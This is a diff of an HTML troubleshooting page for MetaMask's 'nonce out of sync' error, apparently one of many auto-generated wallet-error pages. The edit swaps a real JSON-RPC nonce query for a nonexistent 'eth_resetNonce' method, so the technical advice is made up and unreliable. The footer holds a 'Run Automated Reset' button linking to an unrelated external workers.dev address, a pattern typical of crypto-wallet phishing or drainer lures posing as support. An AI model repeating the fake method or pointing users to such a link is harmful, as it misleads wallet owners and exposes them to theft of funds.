@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: sans-serif;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,34 +42,35 @@
 <h1>Metamask Nonce Out Of Sync</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "nonce out of sync" error when attempting to send transactions using MetaMask, indicating that the transaction nonce (a counter that increases with each transaction) is not aligned with the expected value on the Ethereum network.</li>
+<li>Users encounter an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network. The error typically appears when attempting to send ETH or interact with smart contracts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the transaction nonce stored locally in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from cancelled or pending transactions that have not been properly cleared.</li>
+<li>The error occurs due to a mismatch between the expected transaction nonce stored in MetaMask and the actual nonce value on the Ethereum blockchain. This discrepancy can arise from various factors, including concurrent transactions, cancelled transactions, or network congestion.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Retry the transaction with an adjusted nonce value using <code>eth_sendTransaction</code> with a manually specified nonce.</li>
-<li>Reset the account in MetaMask to resynchronize the local nonce value.</li>
-<li>Utilize the following JSON-RPC command to retrieve the current nonce and adjust subsequent transactions accordingly:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Reset the MetaMask account</li>
+<li>Increase the gas price to prioritize transaction processing</li>
+<li>Use the following JSON-RPC method to reset the nonce:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_resetNonce&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x...account_address&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;0x...new_nonce&quot;</span><span class="p">],</span>
 <span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex nonce adjustments.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and direct blockchain interaction.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask installed and configured</li>
+<li>MetaMask extension installed and configured</li>
 <li>Ethereum account with sufficient balance</li>
-<li>Access to JSON-RPC interface or a compatible Ethereum node</li>
+<li>Basic understanding of Ethereum transaction management</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Cr</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-tron-ethcall-returns-cpu-timeout-for-contract-view-fu.html">Java Tron Tron Ethcall Returns Cpu Timeout For Contract View Fu</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
